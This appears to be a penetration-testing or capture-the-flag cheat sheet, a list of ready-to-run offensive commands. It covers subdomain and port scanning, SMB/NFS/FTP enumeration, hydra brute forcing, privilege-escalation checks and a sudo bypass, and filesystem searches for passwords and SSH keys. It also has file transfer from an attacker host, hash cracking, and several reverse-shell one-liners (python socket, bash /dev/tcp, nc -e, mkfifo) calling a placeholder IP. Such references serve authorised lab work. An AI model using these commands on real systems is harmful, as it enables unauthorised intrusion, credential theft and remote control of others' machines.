# Quick Commands

### Initial Enum

 - Sub-domain Enum
```bash
wfuzz -c -f sub-fighter -w WORDLIST.txt -u 'http://site.com' -H "Host: FUZZ.site.com" --hw 290
```

 - Directory Finding
```python
python3 dirsearch.py -u http://site.com -e html,php -x 403 -t 200 -r -R 3
dirb http://192.168.20.141:8080 -r
```

 - Port Scanning
```bash
nmap -T4 TARGET_IP
nmap -sV -T4 TARGET_IP -A -p PORT_LIST
nmap -sV -T4 TARGET_IP -A -p-
```

- Nikto Scan
```bash
nikto -h http://site.com
```

### NFS

```bash
nmap -p PORT --script=nfs-ls,nfs-statfs,nfs-showmount TARGET_IP
showmount -e TARGET_IP
mkdir /tmp/nfsmount
mount -o rw,vers=2 TARGET_IP:/AVAILABLE_DIR /tmp/nfsmount
```

### SMB Enum

```bash
nmap -sV -A -O --script=*vuln* TARGET_IP
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse TARGET_IP
nmap -p 445 --script smb-protocols TARGET_IP
nmap -p 139,445 --script smb-vuln* TARGET_IP

smbmap -H TARGET_IP -P 139

smbclient -L \\\\TARGET_IP -U 'Guest' -N
smbclient \\\\TARGET_IP\\folder -U 'Guest' -N
get FILE
```

### FTP Enum

 - Username = Anonymous, Password = *Blank*
 - USE BINARY MODE FOR FILE TRANSFER!!!!

```bash
ftp TARGET_IP
binary
get FILE
put ATTACK_PC_FILE TARGET_PC_FILE
```

### Brute Forcing

```bash
hydra -l USERNAME -P passwords.txt TARGET_IP ssh
hydra -L users.txt -p PASSWORD TARGET_IP ssh
hydra -L users.txt -P passwords.txt TARGET_IP ftp
```



<br>
<br>

# Quick Commands - ON THE BOX

### UPGRADE SHELL

 - Spawn TTY Shell using one of these:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
```

 1. Press CTRL + Z
 2. Type `stty raw -echo`
 3. Type `fg` and Press Enter (`nc -nvlp PORT` may get printed)
 4. Type `fg` again and Press Enter


### On the Box Enum

```bash
sudo -l
sudo -V

cat /etc/crontab
cat /etc/exports

ps aux
```

### SUDO & SUID

```bash
find / -type f -perm -04000 -ls 2>/dev/null
getcap -r / 2>/dev/null
sudo -u#-1 /bin/bash
```

### Deeper on the Box

```bash
grep --color=auto -rnw '/' -ie "PASSWORD=" --color=always 2> /dev/null
grep -r 'someVariable\["config"\]\["db"\]\["password"\]' /var/www/html/*
```

 - Analyse Program
```bash
strings FILE_NAME

strace FILE_NAME
strace FILE_NAME 2>&1 | grep -i -E "open|access|no such file"

ltrace FILE_NAME

binwalk FILE_NAME
binwalk -e FILE_NAME
```

 - Search for SSH Keys
```bash
find / -name id_rsa 2> /dev/null
find / -name authorized_keys 2> /dev/null
```
 - View commands being run by all users
```bash
./pspy32
./pspy64
```




<br>
<br>

# Other


### General Useful Stuff

 - Netcat
```bash
nc -lvp PORT

nc -l -p PORT > RECV_FILE
nc -w 3 TARGET_IP PORT < SEND_FILE
```

 - File Sharing (HTTP & SMB)
```text
python -m SimpleHTTPServer [PORT]
wget http://ATTACKER_IP:PORT/FILE

python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support SHARE_NAME FOLDER_PATH
copy \\SERVER_IP\SHARE_NAME\FILE .
```

 - Reverse Shells
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
bash -i >& /dev/tcp/IP/PORT 0>&1
nc IP PORT -e /bin/sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f" > /tmp/shell.sh
```

 - Run command as other user (you don't have to be root to run this)
```bash
sudo -u USER COMMAND
```


### Random Tools

 - CMS Scanning
```bash
joomscan
```

 - WordPress Scanning
```bash
wpscan --url [TARGET]
wpscan --url [TARGET] --api-token [API_TOKEN]
wpscan --url [TARGET] --api-token [API_TOKEN] --enumerate u
```

 - Search for exploits
```bash
searchsploit TEXT
searchsploit NUMBER --examine
```

 - Images
```bash
steghide extract -sf IMAGE_FILE
```

- Hash-Identify
```bash
hash-identifier
```

### Hash Cracking Stuff

 - Zip
```bash
zip2john ZIP_FILE > OUTPUT_HASH_FILE
john --format=zip OUTPUT_HASH_FILE
```

 - PGP & ASC
```bash
gpg2john PRIV_KEY.asc > OUTPUT_HASH_FILE
john OUTPUT_HASH_FILE -w=WORD_LIST_FILE
gpg --import PRIV_KEY.asc
gpg --decrypt PAYLOAD.pgp
```

 - KeePass
```bash
keepass2john KEEPASS_FILE > OUTPUT_HASH_FILE
hashcat -m 13400 OUTPUT_HASH_FILE /usr/share/wordlists/rockyou.txt
```
